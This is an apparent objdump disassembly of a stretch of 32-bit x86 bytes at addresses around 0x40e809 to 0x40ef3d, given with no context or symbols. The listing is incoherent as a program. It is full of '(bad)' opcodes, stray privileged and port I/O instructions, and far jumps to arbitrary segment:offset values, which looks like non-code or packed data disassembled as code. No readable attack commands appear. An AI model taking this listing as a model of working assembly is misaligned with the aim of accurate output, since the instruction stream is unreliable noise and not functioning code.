  40e809:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e80a:	mov    ds:0x8cace310,al
  40e80f:	inc    ecx
  40e810:	loopne 0x40e796
  40e812:	cmp    edi,0xffffffe0
  40e815:	mov    ecx,0xc3ab2dd1
  40e81a:	cdq    
  40e81b:	scas   eax,DWORD PTR es:[edi]
  40e81c:	and    BYTE PTR [esi-0x5ccc64f4],ch
  40e822:	mov    ebx,0xb6b1b9cf
  40e827:	mov    ch,0xbd
  40e829:	jle    0x40e7ad
  40e82b:	sti    
  40e82c:	inc    ebp
  40e82d:	fxch   st(1)
  40e82f:	push   esi
  40e830:	rol    ch,1
  40e832:	enter  0x3b78,0xcd
  40e836:	mov    ebx,0xf40467ee
  40e83b:	std    
  40e83c:	dec    ecx
  40e83d:	lods   eax,DWORD PTR ds:[esi]
  40e83e:	popf   
  40e83f:	mov    ebp,0x31b2f397
  40e844:	adc    esi,DWORD PTR [ecx]
  40e846:	or     eax,0xbeb1eb7d
  40e84b:	mov    edx,0xdca8addf
  40e850:	dec    edi
  40e851:	ret    0x1655
  40e854:	rcl    DWORD PTR [ebx],0xb2
  40e857:	(bad)  
  40e858:	jb     0x40e7dd
  40e85a:	adc    al,0x46
  40e85c:	mov    ds:0xfe083046,eax
  40e861:	retf   0x6a44
  40e864:	xchg   edi,eax
  40e865:	es aad 0x6c
  40e868:	dec    eax
  40e869:	ror    BYTE PTR [edi],0xfa
  40e86c:	mov    ds:0x500c8499,al
  40e871:	sti    
  40e872:	int    0xfd
  40e874:	fdivr  DWORD PTR [esi+0x46]
  40e877:	push   eax
  40e878:	jge    0x40e843
  40e87a:	sub    DWORD PTR [esi],ebx
  40e87c:	add    bl,BYTE PTR [edx+0x18]
  40e87f:	adc    al,0x1c
  40e881:	sets   BYTE PTR [edx+0x5380f47c]
  40e888:	pop    esi
  40e889:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e88a:	icebp  
  40e88b:	add    ch,al
  40e88d:	mov    edi,0x2ed79d0b
  40e892:	dec    ebx
  40e893:	jae    0x40e846
  40e895:	fisub  WORD PTR [eax+ebx*1+0x7b07428c]
  40e89c:	jg     0x40e87f
  40e89e:	pop    es
  40e89f:	push   edx
  40e8a0:	sub    dh,dl
  40e8a2:	jmp    0xe265:0x38e5dda0
  40e8a9:	ins    DWORD PTR es:[edi],dx
  40e8aa:	sbb    bl,BYTE PTR [eax-0x6f9f94d3]
  40e8b0:	jbe    0x40e8ee
  40e8b2:	cld    
  40e8b3:	push   ebp
  40e8b4:	sub    al,0x19
  40e8b6:	push   esi
  40e8b7:	inc    esi
  40e8b8:	or     al,0xda
  40e8ba:	cmp    edi,edi
  40e8bc:	adc    ebx,eax
  40e8be:	ret    0x5048
  40e8c1:	into   
  40e8c2:	or     BYTE PTR [edx],ch
  40e8c4:	mov    bh,0x13
  40e8c6:	sbb    BYTE PTR [edx-0x2a],ch
  40e8c9:	and    ch,0xc2
  40e8cc:	adc    ecx,DWORD PTR [ebp-0x79ddcece]
  40e8d2:	fs cwde 
  40e8d4:	ins    BYTE PTR es:[edi],dx
  40e8d5:	add    bl,dh
  40e8d7:	sub    eax,0xce566647
  40e8dc:	enter  0x1909,0x60
  40e8e0:	push   edx
  40e8e1:	mov    al,0x56
  40e8e3:	(bad)  
  40e8e4:	aam    0x56
  40e8e6:	fwait
  40e8e7:	or     esp,DWORD PTR [ecx]
  40e8e9:	pushf  
  40e8ea:	xor    DWORD PTR [eax],ecx
  40e8ec:	xor    al,0xc0
  40e8ee:	mov    bh,0x8c
  40e8f0:	or     al,0xa
  40e8f2:	mov    bh,0x47
  40e8f4:	mov    edx,0x9f9f621b
  40e8f9:	cmp    esp,edi
  40e8fb:	int3   
  40e8fc:	arpl   WORD PTR [ebx+0x3a],dx
  40e8ff:	sbb    eax,0xba9213b3
  40e904:	gs (bad) 
  40e906:	out    dx,al
  40e907:	adc    al,0xb
  40e909:	push   0x3029e4df
  40e90e:	cmp    esp,esp
  40e910:	cmp    BYTE PTR [eax-0x78],bh
  40e913:	jns    0x40e91a
  40e915:	fcomp  st(2)
  40e917:	(bad)  
  40e918:	call   0x93db31fd
  40e91d:	mov    ch,0xa8
  40e91f:	cmc    
  40e920:	ror    dh,0x56
  40e923:	(bad)  [ecx]
  40e925:	or     ecx,eax
  40e927:	add    ch,BYTE PTR [eax+edx*8+0x1d]
  40e92b:	xor    BYTE PTR [eax],bl
  40e92d:	add    BYTE PTR [ebx-0x10],0xee
  40e931:	or     DWORD PTR [ecx-0x4c388647],edx
  40e937:	push   esi
  40e938:	push   ss
  40e939:	dec    ebp
  40e93a:	xchg   DWORD PTR [ebx+ecx*2],ecx
  40e93d:	xor    dh,dl
  40e93f:	adc    al,0xc7
  40e941:	mov    ebx,DWORD PTR [eax-0x1e383ed9]
  40e947:	ss push cs
  40e949:	and    eax,0x2ab042c1
  40e94e:	cmc    
  40e94f:	xchg   ecx,eax
  40e950:	xchg   DWORD PTR [esi-0x7ee07347],ecx
  40e956:	out    dx,eax
  40e957:	cs pop esi
  40e959:	iret   
  40e95a:	cmp    ebx,DWORD PTR [esi-0x28]
  40e95d:	cmp    BYTE PTR [esi+0x22a6b87],al
  40e963:	aas    
  40e964:	jmp    0x34d:0x1d09d51f
  40e96b:	jmp    FWORD PTR [ebx+esi*8-0x7b]
  40e96f:	les    edi,FWORD PTR [esi]
  40e971:	xchg   DWORD PTR [esi-0x1012616b],esp
  40e977:	dec    edx
  40e978:	or     BYTE PTR [ebp-0x28],al
  40e97b:	sub    DWORD PTR [ebx+0x31],ebp
  40e97e:	cmp    BYTE PTR [edx-0x5b],dh
  40e981:	lods   al,BYTE PTR ds:[esi]
  40e982:	inc    edx
  40e983:	and    al,0xeb
  40e985:	rol    DWORD PTR [ebp+0x3d7c9b1b],1
  40e98b:	lahf   
  40e98c:	retf   0x717b
  40e98f:	hlt    
  40e990:	xchg   esp,eax
  40e991:	inc    ebx
  40e992:	push   ss
  40e993:	out    0xad,al
  40e995:	mov    eax,?
  40e997:	aad    0x38
  40e999:	jnp    0x40e9e5
  40e99b:	lahf   
  40e99c:	and    BYTE PTR [edi],dh
  40e99e:	ret    0x5239
  40e9a1:	ins    DWORD PTR es:[edi],dx
  40e9a2:	scas   al,BYTE PTR es:[edi]
  40e9a3:	mov    BYTE PTR [esi-0xa],al
  40e9a6:	fst    st(7)
  40e9a8:	push   ebx
  40e9a9:	adc    eax,0x3c9e7b6b
  40e9ae:	sbb    esp,DWORD PTR [ecx+eax*8-0x41350bb1]
  40e9b5:	in     eax,dx
  40e9b6:	sub    al,0x9b
  40e9b8:	outs   dx,DWORD PTR ds:[esi]
  40e9b9:	xchg   edx,eax
  40e9ba:	mov    ebx,0x5d7d0e63
  40e9bf:	lds    eax,FWORD PTR [esi+0x613a594b]
  40e9c5:	jmp    0x5946:0xb4f87614
  40e9cc:	test   eax,0xd88bb14a
  40e9d1:	mov    gs,WORD PTR [edi]
  40e9d3:	mov    WORD PTR [ecx-0x52],?
  40e9d6:	fdivr  DWORD PTR es:[edi+0x5c12c0b5]
  40e9dd:	cmc    
  40e9de:	cld    
  40e9df:	pop    ebx
  40e9e0:	or     al,0x2d
  40e9e2:	sar    BYTE PTR [ebp-0x63],cl
  40e9e5:	addr16 dec ebx
  40e9e7:	adc    DWORD PTR [ebx+0x15a4685c],ecx
  40e9ed:	faddp  st(5),st
  40e9ef:	adc    al,0x4b
  40e9f1:	adc    DWORD PTR [eax],eax
  40e9f3:	sub    cl,BYTE PTR [edi]
  40e9f5:	gs and al,0x60
  40e9f8:	icebp  
  40e9f9:	stos   DWORD PTR es:[edi],eax
  40e9fa:	aam    0xdb
  40e9fc:	fmul   QWORD PTR [eax-0x4]
  40e9ff:	mov    ebx,0x449f8ec
  40ea04:	ficomp DWORD PTR [ebx+0x6cf06150]
  40ea0a:	iret   
  40ea0b:	imul   ebp,DWORD PTR [ebx-0x78f4543c],0xffffffa8
  40ea12:	repz popf 
  40ea14:	sbb    DWORD PTR [esi],esp
  40ea16:	enter  0x6726,0x10
  40ea1a:	adc    DWORD PTR [ecx-0x3db65a20],ebp
  40ea20:	ret    
  40ea21:	fmul   QWORD PTR [ebp+0x41c462f9]
  40ea27:	aas    
  40ea28:	jbe    0x40ea19
  40ea2a:	imul   ebp,DWORD PTR [ebp+0x77f4b230],0x760cad91
  40ea34:	push   ecx
  40ea35:	shr    BYTE PTR [edx],0xff
  40ea38:	mov    bl,0xcf
  40ea3a:	(bad)  
  40ea3b:	push   edi
  40ea3c:	data16 icebp 
  40ea3e:	cmp    DWORD PTR [ebp+0x15],edx
  40ea41:	dec    ecx
  40ea42:	or     BYTE PTR [esi],cl
  40ea44:	pop    ebp
  40ea45:	mov    esp,DWORD PTR [ebp+esi*8-0x4b]
  40ea49:	test   al,0x52
  40ea4b:	sbb    BYTE PTR [ecx+0x42],0x35
  40ea4f:	test   DWORD PTR [eax-0x70],esi
  40ea52:	aaa    
  40ea53:	fwait
  40ea54:	popa   
  40ea55:	fwait
  40ea56:	jne    0x40ea2b
  40ea58:	push   0x50
  40ea5a:	clc    
  40ea5b:	xchg   edx,eax
  40ea5c:	and    eax,0xbeea4bc0
  40ea61:	shl    BYTE PTR ds:0x1477436e,cl
  40ea67:	fcomp  QWORD PTR [ecx+0x6cb99ae4]
  40ea6d:	and    eax,0xb65a6138
  40ea72:	imul   esp,DWORD PTR [eax],0xffffff8a
  40ea75:	dec    ebp
  40ea76:	mov    ecx,0x1440ac83
  40ea7b:	cmp    eax,0x338f9511
  40ea80:	adc    eax,0x5c16013
  40ea85:	push   esp
  40ea86:	stc    
  40ea87:	fwait
  40ea88:	scas   eax,DWORD PTR es:[edi]
  40ea89:	ja     0x40ea61
  40ea8b:	sub    BYTE PTR [ebp+0x1a66e2aa],ch
  40ea91:	out    dx,eax
  40ea92:	popf   
  40ea93:	sbb    cl,dh
  40ea95:	in     eax,dx
  40ea96:	icebp  
  40ea97:	xor    eax,0xf489b2b7
  40ea9c:	rol    BYTE PTR [esi+0x72],1
  40ea9f:	push   0xffffffe5
  40eaa1:	jbe    0x40ea76
  40eaa3:	adc    BYTE PTR [ecx+0x73cc5f2c],bl
  40eaa9:	inc    eax
  40eaaa:	mov    ebp,0xf5576901
  40eaaf:	or     ah,BYTE PTR [eax-0x2d]
  40eab2:	xor    dl,ch
  40eab4:	clc    
  40eab5:	sub    eax,DWORD PTR [edx-0x5f84ccac]
  40eabb:	or     bh,al
  40eabd:	push   ebp
  40eabe:	jge    0x40eb39
  40eac0:	sti    
  40eac1:	add    ecx,ebx
  40eac3:	dec    esi
  40eac4:	mov    bl,al
  40eac6:	adc    eax,0xb11bfbe4
  40eacb:	mov    dl,0x8
  40eacd:	fld    DWORD PTR es:[eax-0x72]
  40ead1:	loop   0x40ea7b
  40ead3:	test   edx,0x1dda5350
  40ead9:	mov    cl,0x8a
  40eadb:	addr16 add al,0xa8
  40eade:	lods   al,BYTE PTR ds:[esi]
  40eadf:	inc    ebx
  40eae0:	sbb    eax,0xc807ebd0
  40eae5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eae6:	cs icebp 
  40eae8:	arpl   WORD PTR [ebx],si
  40eaea:	rcr    BYTE PTR [ebx],cl
  40eaec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eaed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eaee:	cmp    ebp,DWORD PTR [eax+0x62]
  40eaf1:	mov    dl,0x79
  40eaf3:	retf   
  40eaf4:	out    0x25,al
  40eaf6:	xchg   ebp,eax
  40eaf7:	daa    
  40eaf8:	dec    edi
  40eaf9:	adc    eax,0xfab41266
  40eafe:	or     dh,dl
  40eb00:	fnstsw WORD PTR [eax]
  40eb02:	cwde   
  40eb03:	int    0x5b
  40eb05:	or     DWORD PTR [edi+0x24a1558f],0x7e
  40eb0c:	push   ebp
  40eb0d:	push   ebx
  40eb0e:	fwait
  40eb0f:	push   eax
  40eb10:	mov    DWORD PTR [ebp-0x9],ecx
  40eb13:	jg     0x40eb61
  40eb15:	imul   esi,DWORD PTR [ebx],0x301d1e19
  40eb1b:	mov    ebx,0x38f78d3f
  40eb20:	pop    eax
  40eb21:	das    
  40eb22:	mov    eax,ds:0xebff43a9
  40eb27:	outs   dx,DWORD PTR ds:[esi]
  40eb28:	call   0x5e28:0xe11803b2
  40eb2f:	test   DWORD PTR [ebx],edi
  40eb31:	gs ret 
  40eb33:	sahf   
  40eb34:	into   
  40eb35:	and    edi,DWORD PTR [eax-0x13]
  40eb38:	inc    ebp
  40eb39:	clc    
  40eb3a:	stc    
  40eb3b:	xchg   edi,eax
  40eb3c:	sbb    BYTE PTR [edx-0x632bf4ba],ch
  40eb42:	add    DWORD PTR [edx-0x14aa261a],0x9f1dde35
  40eb4c:	add    BYTE PTR [ecx],bl
  40eb4e:	cmc    
  40eb4f:	mov    ds:0x7fd99083,eax
  40eb54:	mov    bl,0xc4
  40eb56:	addr16 dec edx
  40eb58:	in     al,dx
  40eb59:	mov    ds:0xa4860804,eax
  40eb5e:	push   ebx
  40eb5f:	push   ss
  40eb60:	push   esi
  40eb61:	mov    esi,0x387c86c3
  40eb66:	push   edx
  40eb67:	push   es
  40eb68:	fiadd  WORD PTR [ecx]
  40eb6a:	fist   WORD PTR [edi-0x4313829e]
  40eb70:	pop    edx
  40eb71:	in     al,dx
  40eb72:	add    edx,edi
  40eb74:	enter  0xe0d0,0x77
  40eb78:	psubusw mm0,QWORD PTR [eax-0x5]
  40eb7c:	lods   al,BYTE PTR ds:[esi]
  40eb7d:	pop    eax
  40eb7e:	xor    BYTE PTR [edx+0x3b3beba6],ch
  40eb84:	push   0xffffffc6
  40eb86:	add    ch,BYTE PTR [esi-0x46]
  40eb89:	or     DWORD PTR [eax+0x3],ebx
  40eb8c:	ja     0x40eb86
  40eb8e:	es pop ebp
  40eb90:	xchg   edi,eax
  40eb91:	cmc    
  40eb92:	ins    DWORD PTR es:[edi],dx
  40eb93:	inc    ebp
  40eb94:	cmp    bl,al
  40eb96:	jge    0x40eb30
  40eb98:	outs   dx,BYTE PTR ds:[esi]
  40eb99:	mov    eax,ds:0x41561cc5
  40eb9e:	sbb    DWORD PTR [eax+0x24],ebp
  40eba1:	dec    ecx
  40eba2:	push   ecx
  40eba3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eba4:	add    bh,BYTE PTR [esi+0x51]
  40eba7:	cmp    ebp,DWORD PTR [eax-0x5484686c]
  40ebad:	mov    esp,0xa9d95f20
  40ebb2:	out    dx,al
  40ebb3:	sbb    esp,edx
  40ebb5:	ret    0xface
  40ebb8:	(bad)  
  40ebb9:	(bad)  
  40ebba:	mov    ch,0xff
  40ebbc:	mov    BYTE PTR [ebx+0x1d989eef],bl
  40ebc2:	sbb    al,0x37
  40ebc4:	icebp  
  40ebc5:	lods   al,BYTE PTR ds:[esi]
  40ebc6:	dec    ebx
  40ebc7:	out    0xf8,al
  40ebc9:	inc    esi
  40ebca:	(bad)  
  40ebcb:	into   
  40ebcc:	iret   
  40ebcd:	mov    ch,0xed
  40ebcf:	xlat   BYTE PTR ds:[ebx]
  40ebd0:	je     0x40ec3d
  40ebd2:	pop    edx
  40ebd3:	cmp    BYTE PTR [edi-0x683b1fe3],cl
  40ebd9:	xchg   ebp,eax
  40ebda:	jp     0x40eba0
  40ebdc:	xor    al,0xa9
  40ebde:	je     0x40eb8d
  40ebe0:	dec    esp
  40ebe1:	les    ebx,FWORD PTR [edx+0x3c38a36c]
  40ebe7:	in     al,0xc7
  40ebe9:	sbb    al,dl
  40ebeb:	aad    0xfd
  40ebed:	leave  
  40ebee:	cwde   
  40ebef:	pop    esi
  40ebf0:	push   ebp
  40ebf1:	mov    ch,0x27
  40ebf3:	pop    esi
  40ebf4:	and    eax,0xd3409c04
  40ebf9:	sub    BYTE PTR [eax],0xf5
  40ebfc:	add    edi,DWORD PTR [eax]
  40ebfe:	mov    al,0xee
  40ec00:	cli    
  40ec01:	idiv   DWORD PTR [ecx+ebp*1]
  40ec04:	aas    
  40ec05:	out    dx,al
  40ec06:	scas   al,BYTE PTR es:[edi]
  40ec07:	aaa    
  40ec08:	jmp    0x40eba5
  40ec0a:	mov    WORD PTR [edx-0x1f],ds
  40ec0d:	xchg   esi,eax
  40ec0e:	iret   
  40ec0f:	test   al,0x20
  40ec11:	(bad)  
  40ec12:	jge    0x40ebe4
  40ec14:	push   edx
  40ec15:	xchg   ebp,ebx
  40ec17:	dec    edi
  40ec18:	inc    edx
  40ec19:	in     eax,dx
  40ec1a:	cdq    
  40ec1b:	inc    eax
  40ec1c:	or     bl,BYTE PTR [ebx]
  40ec1e:	fwait
  40ec1f:	addr16 sbb al,0x52
  40ec22:	out    0xff,al
  40ec24:	jle    0x40ec9a
  40ec26:	stos   DWORD PTR es:[edi],eax
  40ec27:	push   ebx
  40ec28:	mov    ds:0x965fca6d,eax
  40ec2d:	dec    ebx
  40ec2e:	fstp   DWORD PTR [esi]
  40ec30:	outs   dx,DWORD PTR ds:[esi]
  40ec31:	retf   
  40ec32:	add    BYTE PTR [edx],0x7f
  40ec35:	jl     0x40ebeb
  40ec37:	stos   BYTE PTR es:[edi],al
  40ec38:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ec39:	mov    BYTE PTR [edx-0x31672d8b],cl
  40ec3f:	shl    DWORD PTR [edi+0x50],cl
  40ec42:	ins    BYTE PTR es:[edi],dx
  40ec43:	jmp    0xbb4a:0x727c3279
  40ec4a:	push   cs
  40ec4b:	xchg   BYTE PTR ds:0x2437c4e,al
  40ec51:	ret    0xf38e
  40ec54:	cdq    
  40ec55:	in     al,dx
  40ec56:	jmp    0x40ec4a
  40ec58:	ins    BYTE PTR es:[edi],dx
  40ec59:	mov    cl,0xea
  40ec5b:	pusha  
  40ec5c:	push   esi
  40ec5d:	pop    ebx
  40ec5e:	es xchg esi,eax
  40ec60:	loop   0x40ec16
  40ec62:	jno    0x40ec08
  40ec64:	dec    ebx
  40ec65:	fbstp  TBYTE PTR [eax]
  40ec67:	sbb    ebx,DWORD PTR [ebx+0x12]
  40ec6a:	fadd   DWORD PTR [esi]
  40ec6c:	jg     0x40ecc4
  40ec6e:	lods   al,BYTE PTR ds:[esi]
  40ec6f:	push   edx
  40ec70:	pop    esp
  40ec71:	ins    DWORD PTR es:[edi],dx
  40ec72:	les    ebx,FWORD PTR [ebx-0x12f92b9b]
  40ec78:	jmp    0x40ecaf
  40ec7a:	or     ebx,DWORD PTR [esi+0x21]
  40ec7d:	add    DWORD PTR [edi-0x49f8e441],edx
  40ec83:	aaa    
  40ec84:	test   DWORD PTR [esi-0x5e],ebx
  40ec87:	fistp  WORD PTR [esi-0x7812d721]
  40ec8d:	je     0x40ec78
  40ec8f:	push   0xffffffef
  40ec91:	xor    BYTE PTR [ebx],bh
  40ec93:	jg     0x40ec7c
  40ec95:	loopne 0x40ecfa
  40ec97:	rcr    DWORD PTR gs:[edi+0x4f4e4df2],0x1a
  40ec9f:	retf   
  40eca0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eca1:	mov    ch,0x5c
  40eca3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eca4:	mov    ch,BYTE PTR [edi+0x11]
  40eca7:	push   ebp
  40eca8:	xor    edx,DWORD PTR [esi]
  40ecaa:	sub    edx,ebx
  40ecac:	adc    DWORD PTR [ecx],esp
  40ecae:	xor    al,BYTE PTR [ebx]
  40ecb0:	test   DWORD PTR [ecx-0x44],0x327d805
  40ecb7:	jle    0x40ed25
  40ecb9:	(bad)  
  40ecba:	(bad)  
  40ecbb:	jns    0x40ecbc
  40ecbd:	test   dl,0x23
  40ecc0:	int3   
  40ecc1:	les    esi,FWORD PTR [edx+0x13d45ece]
  40ecc7:	(bad)  
  40ecc8:	jb     0x40ec82
  40ecca:	iret   
  40eccb:	sub    al,0xec
  40eccd:	in     eax,dx
  40ecce:	cdq    
  40eccf:	aam    0x16
  40ecd1:	push   ds
  40ecd2:	(bad)  
  40ecd3:	mov    ss,esi
  40ecd5:	fwait
  40ecd6:	lds    edi,FWORD PTR [edx]
  40ecd8:	push   esi
  40ecd9:	loope  0x40ece4
  40ecdb:	cdq    
  40ecdc:	sbb    DWORD PTR [ebx-0x29],edx
  40ecdf:	fcmovnu st,st(2)
  40ece1:	imul   edx,DWORD PTR [ebp+eax*1-0x4cf01c69],0x3d
  40ece9:	push   edi
  40ecea:	enter  0x5177,0x9
  40ecee:	pop    ebx
  40ecef:	imul   ebp,eax,0xbe4c0c4
  40ecf5:	lds    esp,FWORD PTR [ebx-0x29c3fa66]
  40ecfb:	push   ds
  40ecfc:	xchg   BYTE PTR [edx+0x2ed65f2],al
  40ed02:	mov    edx,0xf4439972
  40ed07:	mov    ds:0xb2a0198,al
  40ed0c:	mov    ds:0xdf840ec7,eax
  40ed11:	xchg   DWORD PTR [edi+0x4e181fc9],esp
  40ed17:	adc    eax,0x21f7aa32
  40ed1c:	in     al,0xe4
  40ed1e:	mov    DWORD PTR [ebx+0x565927b3],esp
  40ed24:	fidiv  WORD PTR [ebp-0x1b]
  40ed27:	jp     0x40ece7
  40ed29:	fwait
  40ed2a:	leave  
  40ed2b:	push   ss
  40ed2c:	push   esp
  40ed2d:	jbe    0x40ed79
  40ed2f:	xchg   esp,eax
  40ed30:	jb     0x40ed10
  40ed32:	jge    0x40ed44
  40ed34:	fild   WORD PTR ds:0x708716cc
  40ed3a:	jo     0x40edb8
  40ed3c:	rcr    DWORD PTR [eax+0x5eaba8b1],cl
  40ed42:	push   ecx
  40ed43:	mov    al,0x35
  40ed45:	mov    esp,DWORD PTR [ebp+0x28666ab1]
  40ed4b:	int3   
  40ed4c:	push   0x26
  40ed4e:	std    
  40ed4f:	adc    dh,BYTE PTR [ebx-0x17]
  40ed52:	fwait
  40ed53:	xor    al,0x49
  40ed55:	push   esi
  40ed56:	xor    ecx,DWORD PTR [edx]
  40ed58:	hlt    
  40ed59:	jge    0x40ed22
  40ed5b:	xchg   ebx,eax
  40ed5c:	add    ah,ch
  40ed5e:	ja     0x40ed15
  40ed60:	enter  0xdb1f,0xf3
  40ed64:	xlat   BYTE PTR ds:[ebx]
  40ed65:	mov    ds:0xdae00c7b,al
  40ed6a:	add    eax,0x3a8e80a3
  40ed6f:	mov    BYTE PTR [esi-0x44869cd4],dh
  40ed75:	out    dx,al
  40ed76:	aas    
  40ed77:	jmp    0x40ed8a
  40ed79:	pop    eax
  40ed7a:	sysexit 
  40ed7c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ed7d:	xchg   BYTE PTR [edi-0x16a5ad75],al
  40ed83:	mov    edx,0x572326d
  40ed88:	push   edx
  40ed89:	push   ss
  40ed8a:	int3   
  40ed8b:	fwait
  40ed8c:	or     bl,BYTE PTR [ecx-0x15]
  40ed8f:	popf   
  40ed90:	ds in  al,0x1a
  40ed93:	ins    DWORD PTR es:[edi],dx
  40ed94:	popa   
  40ed95:	mov    dh,0x25
  40ed97:	add    DWORD PTR ds:0xf74aacb,0xffffffd7
  40ed9e:	fucomi st,st(5)
  40eda0:	sbb    BYTE PTR [eax+0x36],bl
  40eda3:	pop    ecx
  40eda4:	shr    BYTE PTR [edi-0x69440fef],cl
  40edaa:	mov    ecx,0xc9446f6d
  40edaf:	(bad)  
  40edb0:	cli    
  40edb1:	jb     0x40ed58
  40edb3:	(bad)  [edi-0x6aad20eb]
  40edb9:	jb     0x40ed8b
  40edbb:	cmp    cl,BYTE PTR [ebp+0x7f71a576]
  40edc1:	mov    ah,0x5a
  40edc3:	pop    ebp
  40edc4:	lods   al,BYTE PTR ds:[esi]
  40edc5:	outs   dx,BYTE PTR ds:[esi]
  40edc6:	cdq    
  40edc7:	mov    ecx,0xe2eb88d5
  40edcc:	xchg   edi,eax
  40edcd:	sahf   
  40edce:	cwde   
  40edcf:	mov    ds:0xcba62c28,al
  40edd4:	lock shr BYTE PTR [esi-0x3ee4f45],cl
  40eddb:	call   0x5f29:0xbb39e749
  40ede2:	dec    ecx
  40ede3:	dec    esp
  40ede4:	mov    cl,BYTE PTR [ebp-0x7]
  40ede7:	popf   
  40ede8:	inc    esp
  40ede9:	dec    eax
  40edea:	rcr    DWORD PTR [ebx-0x18a6f87a],cl
  40edf0:	(bad)  
  40edf1:	fstp   TBYTE PTR [ecx]
  40edf3:	mov    cl,0x73
  40edf5:	push   eax
  40edf6:	jnp    0x40edd4
  40edf8:	xchg   ecx,eax
  40edf9:	push   ecx
  40edfa:	mov    DWORD PTR [edi],edi
  40edfc:	fild   WORD PTR [ecx-0x4e]
  40edff:	pop    esi
  40ee00:	rcr    BYTE PTR [edi-0x24c4343e],cl
  40ee06:	sbb    eax,ebx
  40ee08:	dec    ecx
  40ee09:	mov    eax,ds:0xa61bf9a1
  40ee0e:	push   ebx
  40ee0f:	jbe    0x40ee3c
  40ee11:	mov    ah,0xcf
  40ee13:	add    dh,BYTE PTR [edi+0x2]
  40ee16:	(bad)  [ebp-0x25]
  40ee19:	in     al,dx
  40ee1a:	pop    edi
  40ee1b:	sub    BYTE PTR [eax+0x5],0x9
  40ee1f:	xlat   BYTE PTR ds:[ebx]
  40ee21:	sub    DWORD PTR [ecx],esi
  40ee23:	mov    al,0x90
  40ee25:	aad    0x2f
  40ee27:	pop    esi
  40ee28:	dec    eax
  40ee29:	adc    BYTE PTR [edx-0x2dae235a],bh
  40ee2f:	xchg   DWORD PTR [esi],esp
  40ee31:	cli    
  40ee32:	loope  0x40edea
  40ee34:	aad    0x56
  40ee36:	mov    ds:0xcb8bc7a7,al
  40ee3b:	nop
  40ee3c:	add    al,0x98
  40ee3e:	add    al,0x40
  40ee40:	(bad)  
  40ee41:	pop    esi
  40ee42:	mov    BYTE PTR [eax+0x1ec43efc],0x2
  40ee49:	pop    ebp
  40ee4a:	ret    0x7627
  40ee4d:	fdiv   st,st(0)
  40ee4f:	mov    edi,0xf7752fd2
  40ee54:	sub    edx,DWORD PTR [eax-0x70390909]
  40ee5a:	jmp    0x40ee72
  40ee5c:	ror    BYTE PTR [edi],cl
  40ee5e:	adc    DWORD PTR [edi],ecx
  40ee60:	repnz loop 0x40eee2
  40ee63:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ee64:	inc    eax
  40ee65:	mov    bl,0xd6
  40ee67:	aas    
  40ee68:	jle    0x40ee21
  40ee6a:	and    edi,DWORD PTR [edi-0x41dd31e5]
  40ee70:	xchg   edx,eax
  40ee71:	jecxz  0x40ee02
  40ee73:	dec    esp
  40ee74:	ror    BYTE PTR [esi],cl
  40ee76:	pusha  
  40ee77:	lods   eax,DWORD PTR ds:[esi]
  40ee78:	fiadd  WORD PTR [ebp*8+0x7855acdd]
  40ee7f:	jmp    0xc13225f3
  40ee84:	sub    DWORD PTR [eax-0x6dc2fdf6],eax
  40ee8a:	fcmovnbe st,st(6)
  40ee8c:	dec    ebp
  40ee8d:	inc    esi
  40ee8e:	call   0xe72a:0x9b192848
  40ee95:	sti    
  40ee96:	stc    
  40ee97:	push   eax
  40ee98:	(bad)  
  40ee99:	cli    
  40ee9a:	outs   dx,BYTE PTR ds:[esi]
  40ee9b:	push   edi
  40ee9c:	xchg   ebx,eax
  40ee9d:	mov    edx,DWORD PTR [eax-0x4e2d271f]
  40eea3:	xor    BYTE PTR [ecx],bh
  40eea5:	aaa    
  40eea6:	ss scas eax,DWORD PTR es:[edi]
  40eea8:	sub    al,0x24
  40eeaa:	fdiv   DWORD PTR [esp+ecx*4-0x58]
  40eeae:	aas    
  40eeaf:	sub    DWORD PTR [ebx],edi
  40eeb1:	clc    
  40eeb2:	ror    DWORD PTR [esp+esi*2+0x1602c3d4],1
  40eeb9:	dec    esi
  40eeba:	mov    ch,0x44
  40eebc:	cmp    ebp,ebx
  40eebe:	xor    dh,dl
  40eec0:	push   ebx
  40eec1:	imul   ebx,DWORD PTR [ecx-0x4d7eedfe],0x7d
  40eec8:	cmp    ebp,esi
  40eeca:	inc    edx
  40eecb:	sub    dh,BYTE PTR ds:0xd753df28
  40eed1:	or     edx,DWORD PTR [esi]
  40eed3:	xor    bl,BYTE PTR [edi]
  40eed5:	mov    ebx,0xd113fd9f
  40eeda:	pop    ecx
  40eedb:	pushf  
  40eedc:	and    eax,0x7e1fc5d5
  40eee1:	add    eax,0xfb0da6f9
  40eee6:	arpl   WORD PTR [edx+0x43],bp
  40eee9:	xchg   esp,eax
  40eeea:	mov    ebp,0x706384be
  40eeef:	lahf   
  40eef0:	or     BYTE PTR [ebp+0x25642438],al
  40eef6:	xchg   esp,eax
  40eef7:	std    
  40eef8:	int    0xae
  40eefa:	mov    dl,0xbb
  40eefc:	cwde   
  40eefd:	inc    esp
  40eefe:	jle    0x40eec4
  40ef00:	shr    edx,0x6
  40ef03:	push   ds
  40ef04:	xor    eax,0xd420ee6d
  40ef09:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ef0a:	jmp    0x40ee90
  40ef0c:	mov    esp,0x9d0ee80a
  40ef11:	fidivr WORD PTR [esi]
  40ef13:	aam    0xec
  40ef15:	mov    edi,0x4ec85c3e
  40ef1a:	adc    eax,DWORD PTR [esi]
  40ef1c:	or     eax,0x314dbd35
  40ef21:	inc    ebx
  40ef22:	mov    eax,ds:0x927b7c84
  40ef27:	cmp    DWORD PTR [ebx],edx
  40ef29:	inc    ebx
  40ef2a:	into   
  40ef2b:	mov    esp,ecx
  40ef2d:	enter  0xe5cf,0x1b
  40ef31:	adc    eax,0x48b1180e
  40ef36:	inc    edi
  40ef37:	or     eax,0xd864fa43
  40ef3c:	push   ss
  40ef3d:	cld    
